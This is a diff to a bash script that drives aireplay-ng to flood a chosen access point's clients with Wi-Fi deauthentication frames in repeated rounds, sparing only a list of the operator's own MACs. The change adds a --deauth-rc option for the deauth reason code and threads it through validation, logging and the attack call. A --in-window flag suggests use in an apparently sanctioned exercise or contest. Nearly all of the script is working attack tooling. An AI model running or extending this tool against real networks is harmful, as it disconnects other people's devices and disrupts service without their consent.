@@ -41,6 +41,7 @@
 #   -r  optional: stop after this many rounds (default: until -u, or Ctrl-C)
 #   --in-window  needed for a real run, and only while the official window is open
 #   --dry-run    print the plan and exit
+#   --deauth-rc  optional: reason code of each deauthentication frame, 0 to 254 (default: aireplay-ng's 7)
 #
 # A round sends 5 frames to each target, then waits 2 s. An aireplay-ng call still running after 30 s
 # is stopped, and the run goes on. An aireplay-ng call that exits with an error ends the run at once.
@@ -57,16 +58,21 @@ FRAMES=5        # frames per aireplay-ng call
 PAUSE=2         # seconds between rounds
 CALL_LIMIT=30   # seconds before one aireplay-ng call is stopped
 
-# The two long options are taken out before getopts reads the rest.
+# The long options are taken out before getopts reads the rest.
 IN_WINDOW=0
 DRY_RUN=0
+RC_GIVEN=0
+RC=""
 ARGS=()
-for arg in "$@"; do
-  case "$arg" in
+while (( $# )); do
+  case "$1" in
     --in-window) IN_WINDOW=1 ;;
     --dry-run) DRY_RUN=1 ;;
-    *) ARGS+=("$arg") ;;
+    --deauth-rc) (( $# >= 2 )) || die "--deauth-rc needs a number from 0 to 254"; RC=$2; RC_GIVEN=1; shift ;;
+    --deauth-rc=*) RC=${1#--deauth-rc=}; RC_GIVEN=1 ;;
+    *) ARGS+=("$1") ;;
   esac
+  shift
 done
 set -- "${ARGS[@]}"
 
@@ -103,6 +109,11 @@ done
 [[ "$BSSID" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] || die "-b must be a BSSID such as 11:22:33:44:55:66"
 [[ "$CHANNEL" =~ ^[0-9]+$ ]] || die "-c must be a channel number, e.g. 6"
 [[ -z "$ROUNDS" || "$ROUNDS" =~ ^[1-9][0-9]*$ ]] || die "-r must be a whole number above 0"
+if (( RC_GIVEN )); then
+  [[ "$RC" =~ ^[0-9]{1,3}$ ]] && (( 10#$RC <= 254 )) || die "--deauth-rc must be a number from 0 to 254, such as 3. The default is 7."
+fi
+rc_args=()
+(( RC_GIVEN )) && rc_args=(--deauth-rc "$RC")
 if [[ -n "$UNTIL" ]]; then
   [[ "$UNTIL" =~ ^([01][0-9]|2[0-3]):[0-5][0-9]$ ]] || die "-u must be a time such as 12:30, on this machine's clock"
   UNTIL_EPOCH=$(date -d "today $UNTIL" +%s)
@@ -161,6 +172,9 @@ else
   echo "[*] One round is one call per client: aireplay-ng --deauth $FRAMES -a $BSSID -c <client> <monitor>"
 fi
 
+if (( RC_GIVEN )); then
+  echo "[*] Deauthentication reason code $RC (aireplay-ng --deauth-rc). Without the option, aireplay-ng uses 7."
+fi
 if [[ -n "$MONIFACE" ]]; then
   echo "[*] $MONIFACE is already in monitor mode: this run uses it as it is, and leaves it up."
 fi
@@ -209,7 +223,7 @@ else
   wifi_set_channel "$CHANNEL"
 fi
 {
-  echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  start $(date +%F_%T)"
+  echo "# BSSID $BSSID  channel $CHANNEL  frames $FRAMES  pause ${PAUSE}s  call limit ${CALL_LIMIT}s  rounds ${ROUNDS:-no limit}  until ${UNTIL:-Ctrl-C}  reason ${RC:-default 7}  start $(date +%F_%T)"
   if (( LIVE )); then
     echo "# targets: every other client the run's capture lists on the AP, except the MACs in $OWNLIST"
   else
@@ -280,7 +294,7 @@ while [[ -z "$ROUNDS" ]] || (( round <= ROUNDS )); do
     else
       dest=(-c "$tgt")
     fi
-    out=$(timeout "$CALL_LIMIT" aireplay-ng --ignore-negative-one --deauth "$FRAMES" -a "$BSSID" "${dest[@]}" "$MON" 2>&1)
+    out=$(timeout "$CALL_LIMIT" aireplay-ng --ignore-negative-one --deauth "$FRAMES" -a "$BSSID" "${dest[@]}" ${rc_args[@]+"${rc_args[@]}"} "$MON" 2>&1)
     rc=$?
     printf '%s\n' "$out" >> "$RAW"
     last=$(printf '%s\n' "$out" | tail -n 1)
